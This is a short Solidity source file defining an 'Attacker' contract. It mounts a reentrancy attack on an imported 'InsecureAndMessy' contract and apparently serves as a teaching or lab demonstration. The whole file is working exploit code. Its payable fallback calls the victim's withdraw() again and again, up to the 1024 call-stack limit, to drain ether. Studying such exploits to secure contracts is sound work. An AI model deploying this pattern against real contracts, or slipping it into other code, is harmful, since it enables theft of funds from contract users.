pragma solidity ^0.4.9;

import './InsecureAndMessy.sol';

contract Attacker {

  uint public count;
  int public iterationRequired;
  uint constant attackWith = 1 ether;
  InsecureAndMessy victim;

  function Attacker (address victim_address) {
	victim = InsecureAndMessy(victim_address);
  }

  function attack() {
	// Just to add attacker to shares in victim contract
	// all subsequent withdraw will send us 1 ether
	victim.transfer(attackWith);
	iterationRequired = this.getIterationCount(msg.sender.balance);

	victim.withdraw();
  }

  function getIterationCount(uint balance) constant returns (int) {
    int result = int(balance / attackWith);
	if (result < 1024) {
	  return result;
	}

	// max callstack
	return 1024;
  }

  function () payable {
	iterationRequired--;
	if (iterationRequired > 0) {
	  victim.withdraw();
	}
  }

}
